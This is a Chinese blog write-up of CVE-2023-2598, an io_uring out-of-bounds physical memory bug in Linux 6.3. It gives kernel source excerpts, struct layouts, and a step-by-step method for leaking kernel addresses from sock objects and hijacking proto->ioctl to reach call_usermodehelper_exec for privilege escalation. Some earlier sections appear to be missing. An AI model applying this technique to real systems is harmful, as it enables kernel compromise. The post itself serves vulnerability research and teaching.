---
layout: post
title: 【kernel exploit】CVE-2023-2598 io-uring物理内存越界读写（伪造sock对象）
categories: Kernel-exploit
description: io-uring子系统存在物理页任意长度越界读写，可以任意读写其后的sock对象，通过`sock->sk_data_ready`泄露内核基址，通过`sock.sk_error_queue.next`泄露sock对象的堆地址，通过伪造`sock.__sk_common.skc_prot->ioctl`函数指针劫持控制流。
keywords: CVE, Kernel, Exploit
---


# 【kernel exploit】CVE-2023-2598 io_uring物理内存越界读写（伪造sock对象）

**影响版本**：Linux 6.3-rc1~6.3.1 

**测试版本**：Linux-v6.3.1  [exploit及测试环境下载地址](https://github.com/bsauce/kernel-exploit-factory)—https://github.com/bsauce/kernel-exploit-factory

**编译选项**： 

**CONFIG_BINFMT_MISC=y** （否则启动VM时报错）

在编译时将`.config`中的`CONFIG_E1000`和`CONFIG_E1000E`，变更为=y。[参考](https://blog.csdn.net/qq_16097611/article/details/104965045)

注释 `CONFIG_SYSTEM_TRUSTED_KEYS` / `CONFIG_SYSTEM_REVOCATION_KEYS` 这两行

```c
$ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.3.1.tar.xz
$ tar -xvf linux-6.3.1.tar.xz
# KASAN: 设置 make menuconfig 设置"Kernel hacking" ->"Memory Debugging" -> "KASan: runtime memory debugger"。
$ make -j32
$ make all
$ make modules
# 编译出的bzImage目录：/arch/x86/boot/bzImage。
```

**漏洞描述**：io_uring模块中的OOB写漏洞，可导致**越界读写物理内存**，漏洞位于目录 `io_uring/rsrc.c` 的 [io_sqe_buffer_register()](https://elixir.bootlin.com/linux/v6.3.1/source/io_uring/rsrc.c#L1230)函数，在检查所提交的待注册page是否属于同一复合页时，仅检查了所在复合页的首页是否一致，而没有检查所提交的page是否为同一page。可以注册同一个物理页（冒充多个物理页组成的复合页），构造物理页任意长度越界读写。


    imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL); 	// 重点是 imu - io_mapped_ubuf对象
	if (!imu)
		goto done;

	ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);
	if (ret) {
		unpin_user_pages(pages, nr_pages);
		goto done;
	}

	off = (unsigned long) iov->iov_base & ~PAGE_MASK;
	size = iov->iov_len; 				// <---- [3] size值来自于用户态
	/* store original address for later verification */
	imu->ubuf = (unsigned long) iov->iov_base; 	// 用户可控
	imu->ubuf_end = imu->ubuf + iov->iov_len;
	imu->nr_bvecs = nr_pages; 					// folio中本值为1
	*pimu = imu; 		 									// [1] imu结构体指针赋值给了pimu
	ret = 0;

	if (folio) { 	// 如果是folio，只需要1个bio_vec，非常高效
		bvec_set_page(&imu->bvec[0], pages[0], size, off); 	// <---- [2] 传入4个参数，一是 bio_vec 结构体, 二是物理页的 head page, 三是从用户态传入的 iov->iov_len, 四是缓冲区的偏移量
		goto done;
	}
	for (i = 0; i < nr_pages; i++) {
		size_t vec_len;

		vec_len = min_t(size_t, size, PAGE_SIZE - off);
		bvec_set_page(&imu->bvec[i], pages[i], vec_len, off);
		off = 0;
		size -= vec_len;
	}
done:
	if (ret)
		kvfree(imu);
	kvfree(pages);
	return ret;
}
// bvec_set_page() —— 对bv进行赋值
static inline void bvec_set_page(struct bio_vec *bv, struct page *page,
		unsigned int len, unsigned int offset)
{
	bv->bv_page = page;
	bv->bv_len = len; 			// pimu->bvec[0].bv_len = iov->iov_len
	bv->bv_offset = offset;
}
```

**imu - `io_mapped_ubuf`结构**：表示已经注册到`io_uring`中的用户态缓冲区信息。

```c
struct io_mapped_ubuf {
	u64		ubuf; 		// 缓冲区起始地址
	u64		ubuf_end; 	// 缓冲区结束地址
	unsigned int	nr_bvecs; 	// 定位这段缓冲区所需的 bio_vec(s) 结构的个数
	unsigned long	acct_pages;
	struct bio_vec	bvec[]; 	// bio_vec(s)数组，bio_vec类似于iovec，但用于存物理内存，定义了一段连续的物理内存地址范围
};

struct bio_vec {
	struct page	*bv_page; 		// 该地址范围对应的首个page
	unsigned int	bv_len; 	// 该地址范围的长度（字节）
	unsigned int	bv_offset; 	// 相对bv_page的起始地址范围
};
```

**`[1]` - imu 值传递**：imu结构体指针传给了 `pimu`，`pimu`来自（[io_sqe_buffers_register()](https://elixir.bootlin.com/linux/v6.3.1/source/io_uring/rsrc.c#L1337) -> [io_sqe_buffer_register()](https://elixir.bootlin.com/linux/v6.3.1/source/io_uring/rsrc.c#L1266)）的`&ctx->user_bufs[i]`参数，后续的io_uring操作都会使用这个 `struct io_ring_ctx *ctx` 结构体。

```c
int io_sqe_buffers_register(struct io_ring_ctx *ctx, void __user *arg,
			    unsigned int nr_args, u64 __user *tags)
{
	struct page *last_hpage = NULL;
	struct io_rsrc_data *data;
	int i, ret;
	struct iovec iov;
    ...
    for (i = 0; i < nr_args; i++, ctx->nr_user_bufs++) {
        ...
        ret = io_sqe_buffer_register(ctx, &iov, &ctx->user_bufs[i],
					     &last_hpage);
        ...
    }
}
```

## 3. 漏洞利用

### 3-1. 利用原语

#### （1）漏洞原语

**利用原语**：可利用`io_uring_register`注册一个跨多个page的缓冲区，但是只会重复映射一个相同的物理页。在虚拟内存中是连续的，但在物理内存中并不连续，在检查此物理页是否属于复合页时，能够通过检查，因为这个物理页确实属于当前的复合页（`page_folio(pages[i]) == folio`）。内核会认为这些连续的虚拟页就是连续的物理页，但实际上是分配了同一个物理页，且**size值来自于用户态（虚拟内存长度 `pimu->bvec[0].bv_len = iov->iov_len`）**，用户可控（见`(6)-[3]`处代码）。可利用io_uring的其他功能，**越界读写当前物理页之后的物理页**。

**可用对象**：由于漏洞可以越界写很多页，就不需考虑对象大小和分配的问题，可利用的对象大小是不限的。例如`sock`对象，包含很多函数指针：

```c
struct sock {
 struct sock_common         __sk_common;          /*     0   136 */ 	// 泄露内核基址
 /* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */
 struct dst_entry *         sk_rx_dst;            /*   136     8 */
 int                        sk_rx_dst_ifindex;    /*   144     4 */
 u32                        sk_rx_dst_cookie;     /*   148     4 */
 socket_lock_t              sk_lock;              /*   152    32 */
 atomic_t                   sk_drops;             /*   184     4 */
 int                        sk_rcvlowat;          /*   188     4 */
 /* --- cacheline 3 boundary (192 bytes) --- */
 struct sk_buff_head        sk_error_queue;       /*   192    24 */
 struct sk_buff_head        sk_receive_queue;     /*   216    24 */
 struct {
  atomic_t           rmem_alloc;           /*   240     4 */
  int                len;                  /*   244     4 */
  struct sk_buff *   head;                 /*   248     8 */
  /* --- cacheline 4 boundary (256 bytes) --- */
  struct sk_buff *   tail;                 /*   256     8 */
 } sk_backlog;                                    /*   240    24 */
 int                        sk_forward_alloc;     /*   264     4 */
 u32                        sk_reserved_mem;      /*   268     4 */
 unsigned int               sk_ll_usec;           /*   272     4 */
 unsigned int               sk_napi_id;           /*   276     4 */
 int                        sk_rcvbuf;            /*   280     4 */

 /* XXX 4 bytes hole, try to pack */

 struct sk_filter *         sk_filter;            /*   288     8 */
 union {
  struct socket_wq * sk_wq;                /*   296     8 */
  struct socket_wq * sk_wq_raw;            /*   296     8 */
 };                                               /*   296     8 */
 struct xfrm_policy *       sk_policy[2];         /*   304    16 */
 /* --- cacheline 5 boundary (320 bytes) --- */
 struct dst_entry *         sk_dst_cache;         /*   320     8 */
 atomic_t                   sk_omem_alloc;        /*   328     4 */
 int                        sk_sndbuf;            /*   332     4 */
 int                        sk_wmem_queued;       /*   336     4 */
 refcount_t                 sk_wmem_alloc;        /*   340     4 */
 long unsigned int          sk_tsq_flags;         /*   344     8 */
 union {
  struct sk_buff *   sk_send_head;         /*   352     8 */
  struct rb_root     tcp_rtx_queue;        /*   352     8 */
 };                                               /*   352     8 */
 struct sk_buff_head        sk_write_queue;       /*   360    24 */
 /* --- cacheline 6 boundary (384 bytes) --- */
 __s32                      sk_peek_off;          /*   384     4 */
 int                        sk_write_pending;     /*   388     4 */
 __u32                      sk_dst_pending_confirm; /*   392     4 */
 u32                        sk_pacing_status;     /*   396     4 */
 long int                   sk_sndtimeo;          /*   400     8 */
 struct timer_list          sk_timer;             /*   408    40 */

 /* XXX last struct has 4 bytes of padding */

 /* --- cacheline 7 boundary (448 bytes) --- */
 __u32                      sk_priority;          /*   448     4 */
 __u32                      sk_mark;              /*   452     4 */
 long unsigned int          sk_pacing_rate;       /*   456     8 */ 	// <--- 可设置标记
 long unsigned int          sk_max_pacing_rate;   /*   464     8 */ 	// <---
    // .. many more fields
 /* size: 760, cachelines: 12, members: 92 */
 /* sum members: 754, holes: 1, sum holes: 4 */
 /* sum bitfield members: 16 bits (2 bytes) */
 /* paddings: 2, sum paddings: 6 */
 /* forced alignments: 1 */
 /* last cacheline: 56 bytes */
} __attribute__((__aligned__(8)));
```

#### （2）设置内存标记

**设置标记**：sock对象中，`sk_pacing_rate`与`sk_max_pacing_rate`成员可通过`setsockopt(SO_MAX_PACING_RATE)`操作进行设置，对应函数为[sk_setsockopt()](https://elixir.bootlin.com/linux/v6.3.1/source/net/core/sock.c#L1427)。可通过设置特殊值来确定是否命中了sock对象，同时设置这两个值可以提高判断的准确性。其他成员（例如`sk_mark`）也可以设置，但是需要`CAP_NET_ADMIN`权限；还有`SO_SNDBUF` - 设置 `sk_sndbuf`、`SO_RCVBUF` - 设置`sk_rcvbuf`。

```c
int sk_setsockopt(struct sock *sk, int level, int optname,
		  sockptr_t optval, unsigned int optlen)
{
	struct so_timestamping timestamping;
	struct socket *sock = sk->sk_socket;
	struct sock_txtime sk_txtime;
	int val;
	int valbool;
	struct linger ling;
	int ret = 0;
    ...
    case SO_MAX_PACING_RATE:
		{
		unsigned long ulval = (val == ~0U) ? ~0UL : (unsigned int)val;

		if (sizeof(ulval) != sizeof(val) &&
		    optlen >= sizeof(ulval) &&
		    copy_from_sockptr(&ulval, optval, sizeof(ulval))) { 		// <---- 从用户空间取值
			ret = -EFAULT;
			break;
		}
		if (ulval != ~0UL)
			cmpxchg(&sk->sk_pacing_status,
				SK_PACING_NONE,
				SK_PACING_NEEDED);
		sk->sk_max_pacing_rate = ulval; 								// 设置 sk_max_pacing_rate
		sk->sk_pacing_rate = min(sk->sk_pacing_rate, ulval); 			// 设置 sk_pacing_rate
		break;
		}
    ...
}
```

#### （3）获取sock对应描述符

**获取socket描述符**：命中sock对象后，还需知道这个socket描述符。也可以通过`setsockopt(SO_SNDBUF)`操作将该socket的文件描述符存储到sock对象中，代码参见[sk_setsockopt()](https://elixir.bootlin.com/linux/v6.3.1/source/net/core/sock.c#L1141)。存入的值是`fd + SOCK_MIN_SNDBUF`（实际写入时会乘以2），读取后解码为`val / 2 - SOCK_MIN_SNDBUF`（通过`getsockopt`读取）。

```c
int sk_setsockopt(struct sock *sk, int level, int optname,
		  sockptr_t optval, unsigned int optlen)
{
	struct so_timestamping timestamping;
	struct socket *sock = sk->sk_socket;
	struct sock_txtime sk_txtime;
	int val;
	int valbool;
	struct linger ling;
	int ret = 0;
	...
    case SO_SNDBUF:
		/* Don't error on this BSD doesn't and if you think
		 * about it this is right. Otherwise apps have to
		 * play 'guess the biggest size' games. RCVBUF/SNDBUF
		 * are treated in BSD as hints
		 */
		val = min_t(u32, val, READ_ONCE(sysctl_wmem_max));
set_sndbuf:
		/* Ensure val * 2 fits into an int, to prevent max_t()
		 * from treating it as a negative value.
		 */
		val = min_t(int, val, INT_MAX / 2);
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		WRITE_ONCE(sk->sk_sndbuf, 							// <--- val值来自用户态，这里需满足一个条件，也即val要大于宏定义 SOCK_MIN_SNDBUF 的值才会被写进 sk_sndbuf 成员中。
			   max_t(int, val * 2, SOCK_MIN_SNDBUF));
		/* Wake up sending tasks if we upped the value. */
		sk->sk_write_space(sk);
		break;
    ...
}
// SOCK_MIN_SNDBUF 宏定义展开如下：要满足 val > SOCK_MIN_SNDBUF, 只需将socket对象的描述符加上 SOCK_MIN_SNDBUF 的值即可。在命中sock对象后，再将sk_sndbuf位置的值减去SOCK_MIN_SNDBUF就是socket对象的描述符。
// SOCK_MIN_SNDBUF = 2 * (2048 + ALIGN(sizeof(sk_buff), 1 << L1_CACHE_SHIFT)), 实际值取决于 L1_CACHE_SHIFT，本例中 L1_CACHE_SHIFT = 6, 因此 SOCK_MIN_SNDBUF = 4608
#define __ALIGN_KERNEL_MASK(x, mask) (((x) + (mask)) & ~(mask))
#define __ALIGN_KERNEL(x, a)  __ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define L1_CACHE_SHIFT  5
#define L1_CACHE_BYTES  (1 << L1_CACHE_SHIFT)
#define ALIGN(x, a)  __ALIGN_KERNEL((x), (a))
#define SMP_CACHE_BYTES L1_CACHE_BYTES
#define SKB_DATA_ALIGN(X) ALIGN(X, SMP_CACHE_BYTES)
#define SK_BUFF_SIZE 224
#define TCP_SKB_MIN_TRUESIZE (2048 + SKB_DATA_ALIGN(SK_BUFF_SIZE))
#define SOCK_MIN_SNDBUF  (TCP_SKB_MIN_TRUESIZE * 2)
```

#### （4）泄露基址&劫持控制流

**泄露内核基址&劫持控制流**：`sock.__sk_common`结构体中的`struct proto *skc_prot`指针指向`proto`对象，`proto`对象中存在很多函数指针，可用于劫持控制流。

```c
// [1] 泄露内核基址: sock对象中含有一些函数指针
struct sock {
    ...
	void                       (*sk_state_change)(struct sock *); /*   672     8 */
	void                       (*sk_data_ready)(struct sock *); /*   680     8 */
	void                       (*sk_write_space)(struct sock *); /*   688     8 */
	void                       (*sk_error_report)(struct sock *); /*   696     8 */
	/* --- cacheline 11 boundary (704 bytes) --- */
	int                        (*sk_backlog_rcv)(struct sock *, struct sk_buff *); /*   704     8 */
	void                       (*sk_destruct)(struct sock *); /*   712     8 */
    ...
} __attribute__((__aligned__(8)));
// 例如TCP socket中，会被初始化为如下函数
sk_state_change <-> <sock_def_wakeup>,
sk_data_ready <-> <sock_def_readable>, 			// <--- 本EXP是用的这个函数来泄露的
sk_write_space <-> <sk_stream_write_space>,
sk_error_report <-> <sock_def_error_report>,
sk_backlog_rcv <-> <tcp_v4_do_rcv>,
sk_destruct <-> <inet_sock_destruct>

// [2] 劫持控制流
struct sock_common {
 union {
  __addrpair         skc_addrpair;         /*     0     8 */
 ...
 struct proto *             skc_prot;             /*    40     8 */ 		// <---
 possible_net_t             skc_net;              /*    48     8 */
......
/* size: 136, cachelines: 3, members: 25 */
 /* sum members: 135 */
 /* sum bitfield members: 7 bits, bit holes: 1, sum bit holes: 1 bits */
 /* last cacheline: 8 bytes */  

struct proto {
 void                       (*close)(struct sock *, long int); /*     0     8 */
 int                        (*pre_connect)(struct sock *, struct sockaddr *, int); /*     8     8 */
 int                        (*connect)(struct sock *, struct sockaddr *, int); /*    16     8 */
 int                        (*disconnect)(struct sock *, int); /*    24     8 */
 struct sock *              (*accept)(struct sock *, int, int *, bool); /*    32     8 */
 int                        (*ioctl)(struct sock *, int, long unsigned int); /*    40     8 */ 	// <--- 可劫持
 int                        (*init)(struct sock *); /*    48     8 */
 void                       (*destroy)(struct sock *); /*    56     8 */
 /* --- cacheline 1 boundary (64 bytes) --- */
 void                       (*shutdown)(struct sock *, int); /*    64     8 */
 int                        (*setsockopt)(struct sock *, int, int, sockptr_t, unsigned int); /*    72     8 */
 int                        (*getsockopt)(struct sock *, int, int, char *, int *); /*    80     8 */
....
```

### 3-2. 利用步骤

**EXP复现注意点**：QEMU需给足够的内存，避免mmap时内存不足；若mmap映射的内存减少，很难命中sock对象。

**利用步骤**：

- （1）通过匿名文件映射内存，然后通过io_uring来实现用户态与内核态内存共享；

- （2）执行`setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE, &egg, sizeof(uint64_t)) < 0)`，设置`sk_pacing_rate` / `sk_max_pacing_rate` 作为标记（`0xdeadbeef`）；——**便于确定漏洞对象后面是`sock`对象**

- （3）执行`setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &j, sizeof(int)`，将 `sk_sndbuf` 设置为 `j = (sockets[i] + SOCK_MIN_SNDBUF)*2`，也即 `(4+4544）*2 = 0x2388`；——**便于确定`sock`对象对应的是哪一个文件描述符**

- （4）通过漏洞（同一物理页的连续地址映射），在io_uring操作之后，检测映射内存中是否命中了sock对象；

- （5）泄露内核基址+堆地址：判断`sk_pacing_rate` / `sk_max_pacing_rate` 是否为正确标记值。确定命中sock对象后，通过sock对象计算距离函数指针的偏移，以此泄露`sk_data_ready_off`函数地址，从而得到**内核基址与sock对象的地址**；通过`sock`中 `sk_error_queue` / `sk_receive_queue` 可泄露sock对象地址。

- （6）泄露socket描述符：通过`sk_sndbuf`的值，减去`SOCK_MIN_SNDBUF`的值 ，可以**得到socket的描述符**，以便后续劫持函数指针之后，对这个socket进行操作；

- （7）在修改和伪造sock内容之前，先对sock数据进行备份，在之后将其还原，某则会导致内核崩溃；

- （8）为了劫持sock对象的函数指针，需**伪造`proto`对象**，放在sock对象之后；

- （9）劫持`proto->ioctl` 函数指针指向[call_usermodehelper_exec()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/umh.c#L434)函数，该函数可在内核空间启动一个用户态进程；

- （10）**问题**：`call_usermodehelper_exec()`需两个参数，`(struct subprocess_info *sub_info, int wait)` ，ioctl函数定义是：`(*ioctl)(struct sock *, int, long unsigned int);` ，它的第一个参数始终指向sock对象，无法在`sock`对象开头来伪造[subprocess_info](https://elixir.bootlin.com/linux/v6.3.1/source/include/linux/umh.h#L20)对象（**因为`sock`开头是`sock_common`，`sock_common->skc_prot` 和`subprocess_info->path`成员重叠了**），也就是说没办法直接调用ioctl去提权。并且，在proto+0x28位置为ioctl函数指针，我们需要覆盖这个函数指针完成劫持，但调用`call_usermodehelper_exec`函数时，其参数`subprocess_info` + 0x28位置是所要执行的用户态程序路径，刚好与ioctl函数指针重叠，这会破坏我们的利用。

  ```c
  int call_usermodehelper_exec(struct subprocess_info *sub_info, int wait);
  
  struct subprocess_info {
  	struct work_struct         work;                 /*     0    32 */
  	struct completion *        complete;             /*    32     8 */
  	const char  *              path;                 /*    40     8 */ 	// path - 指向我们可执行程序的路径
  	char * *                   argv;                 /*    48     8 */  // argv - 指向指针数组，每个指针指向参数
  	char * *                   envp;                 /*    56     8 */  // envp - 类似argv，但存储的是环境变量
  	/* --- cacheline 1 boundary (64 bytes) --- */
  	int                        wait;                 /*    64     4 */
  	int                        retval;               /*    68     4 */
  	int                        (*init)(struct subprocess_info *, struct cred *); /*    72     8 */ 	// init - 初始化函数，设置进程凭证
  	void                       (*cleanup)(struct subprocess_info *); /*    80     8 */ 	// cleanup - 子进程退出时执行
  	void *                     data;                 /*    88     8 */
  
  	/* size: 96, cachelines: 2, members: 10 */
  	/* last cacheline: 32 bytes */
  };
  ```

- （11）可利用`work_struct`（`subprocess_info`的第一个成员对象），表示一个延迟工作的对象。`subprocess_info.work.func`成员是一个函数指针，延迟工作将会调用这个函数指针。调用流程是 [call_usermodehelper_exec()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/umh.c#L434) -> [queue_work()](https://elixir.bootlin.com/linux/v6.3.1/source/include/linux/workqueue.h#L504) -> [queue_work_on()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/workqueue.c#L1552) -> [__queue_work()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/workqueue.c#L1524) -> [insert_work()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/workqueue.c#L1355) —— 加入延迟队列；实际执行时的调用流程是 [call_usermodehelper_exec_work()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/umh.c#L172) -> [user_mode_thread()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/fork.c#L2759) -> [kernel_clone()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/fork.c#L2642) 会启动新进程来执行 [call_usermodehelper_exec_async()](https://elixir.bootlin.com/linux/v6.3.1/source/kernel/umh.c#L110) -> `kernel_execve(sub_info->path, (const char *const *)sub_info->argv, (const char *const *)sub_info->envp);`

  ```c
  struct work_struct {
   atomic_long_t              data;                 /*     0     8 */
   struct list_head           entry;                /*     8    16 */
   work_func_t                func;                 /*    24     8 */
  
   /* size: 32, cachelines: 1, members: 3 */
   /* last cacheline: 32 bytes */
  };
  
  static void call_usermodehelper_exec_work(struct work_struct *work) // work_struct 结构属于 subprocess_info 对象，伪造好 work_struct 即可
  {
  	struct subprocess_info *sub_info =
  		container_of(work, struct subprocess_info, work);
  
  	if (sub_info->wait & UMH_WAIT_PROC) {
  		call_usermodehelper_exec_sync(sub_info);
  	} else {
  		pid_t pid;
  		/*
  		 * Use CLONE_PARENT to reparent it to kthreadd; we do not
  		 * want to pollute current->children, and we need a parent
  		 * that always ignores SIGCHLD to ensure auto-reaping.
  		 */
  		pid = user_mode_thread(call_usermodehelper_exec_async, sub_info,
  				       CLONE_PARENT | SIGCHLD);
  		if (pid < 0) {
  			sub_info->retval = pid;
  			umh_complete(sub_info);
  		}
  	}
  }
  ```
  
